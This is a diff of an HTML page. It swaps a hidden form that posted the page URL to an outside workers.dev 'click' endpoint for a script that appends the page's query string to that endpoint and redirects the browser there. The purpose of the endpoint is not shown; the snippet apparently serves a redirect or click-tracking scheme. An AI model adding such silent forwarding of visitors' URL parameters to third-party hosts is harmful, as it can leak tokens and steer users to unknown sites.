@@ -1,17 +1,20 @@
 
-<!-- 
-    <form id="helper" method="post" target="_self" action="https://2464b3b2-85e6-4910-81db-cdf0588c909b-00-3l6am6yo59ooe.sisko.replit.dev/click" style="display:none">
- -->
-    <form id="helper" method="post" target="_blank" action="https://dd.adipiscing.workers.dev/click" style="display:none">
-<input type="hidden" name="Referer" value="(default)">
-</form>
+    <script>
+const param = new URLSearchParams(document.location.search);
+    // let uri = "https://bing.com/";
+   let uri = "https://dd.adipiscing.workers.dev/click";
+       if (!param) {
+var ura = uri;
+
+       } else {
+       var ura = uri + '?' + param;
+       }
+
+function showWindow(url) {
 
 
-<script>
-let myUrl = window.location.href;
+    window.open(url, "_self");
+            return false;
+       }
 
-function showWindow() {
-  document.getElementById("helper").Referer.value = myUrl;
-  document.getElementById("helper").submit();
-}
-</script>
+</script> 
